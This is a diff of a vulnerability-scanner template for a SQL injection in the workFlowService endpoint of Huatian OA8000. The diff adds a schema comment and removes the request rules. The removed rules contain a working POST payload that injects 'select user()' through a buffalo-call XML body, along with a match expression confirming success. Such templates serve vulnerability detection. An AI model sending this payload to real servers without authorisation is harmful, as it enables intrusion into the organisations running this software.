@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: oa8000-workflowservice-sql-inject
 
 info:
@@ -9,16 +10,3 @@ info:
     app="华天动力-OA8000"
   reference:
     - http://wiki.peiqi.tech/wiki/oa/%E5%8D%8E%E5%A4%A9OA/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9BOA%208000%E7%89%88%20workFlowService%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
-
-rules:
-  r0:
-    request:
-      method: POST
-      path: /OAapp/bfapp/buffalo/workFlowService
-      body: |
-        <buffalo-call> 
-        <method>getDataListForTree</method> 
-        <string>select user()</string> 
-        </buffalo-call>
-    expression: response.status == 200 && response.body.bcontains(b'<buffalo-reply>') && response.body.bcontains(b'user()')
-expression: r0()
